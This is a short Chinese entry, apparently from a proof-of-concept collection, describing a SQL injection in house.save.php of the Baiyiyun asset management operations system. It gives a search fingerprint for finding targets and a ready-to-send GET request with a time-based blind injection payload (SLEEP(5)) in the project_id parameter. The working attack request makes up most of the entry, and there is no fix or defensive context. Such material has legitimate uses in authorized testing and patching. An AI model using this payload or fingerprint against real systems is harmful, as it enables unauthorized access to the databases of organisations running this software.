# 百易云资产管理运营系统house.save.phpSQL注入漏洞

百易云资产管理运营系统house.save.php ｜ SQL注入 ｜ —
- **指纹**：`body="不要着急，点此"`
- **请求**：`GET /adminx/house.save.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(5)))OKTO) HTTP/1.1`
- **响应特征**：200